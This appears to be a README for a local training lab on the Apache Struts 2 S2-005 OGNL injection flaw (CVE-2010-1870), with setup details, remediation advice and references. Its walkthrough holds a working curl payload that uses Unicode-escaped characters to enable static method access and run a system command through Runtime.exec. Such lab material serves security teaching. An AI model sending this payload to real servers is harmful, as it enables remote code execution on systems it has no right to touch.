# Apache Struts 2 S2-005 ParametersInterceptor OGNL RCE (CVE-2010-1870)

## Overview

Apache Struts 2 versions 2.0.0 through 2.1.8.1 contain a remote code execution vulnerability in the ParametersInterceptor. While S2-003 attempted to block # from parameter names, Unicode-escaped characters (\u0023) bypassed the blacklist. Attackers can modify OGNL security member access flags and invoke java.lang.Runtime to execute arbitrary system commands.

- **Service Access**: `http://localhost:8174/`
- **Default Credentials**: `Unauthenticated OGNL parameter injection`
- **Docker Shortcut**: `./lab start struts2-s2005`
- **Container Name**: `cyberlab_04_struts2_s2005`
- **RAM Footprint**: ~250M

---

## Exploitation Walkthrough

### 1. Send OGNL Unicode Bypass Payload

```bash
curl -i 'http://localhost:8174/tags/login.action' \
  -d '(\u0023_memberAccess.allowStaticMethodAccess=true,\u0023context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,\u0023cmd=\"touch /tmp/pwned_s2005\",@java.lang.Runtime@getRuntime().exec(\u0023cmd))(meh)'
```

### 2. Verify File Creation

```bash
docker exec -it cyberlab_04_struts2_s2005 ls -la /tmp/pwned_s2005
```

---

## Defensive Remediation & Hardening

1. Upgrade Apache Struts to version 2.2.1 or newer.
2. Enable strict parameter name validation and enforce OGNL sandbox restrictions.

---

## Video Walkthroughs & Technical References

- [2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)
- [Apache Struts S2-005 Security Advisory](https://cwiki.apache.org/confluence/display/WW/S2-005)
- [Vulhub Struts2 S2-005 Environment](https://vulhub.org/#/environments/struts2/s2-005/)
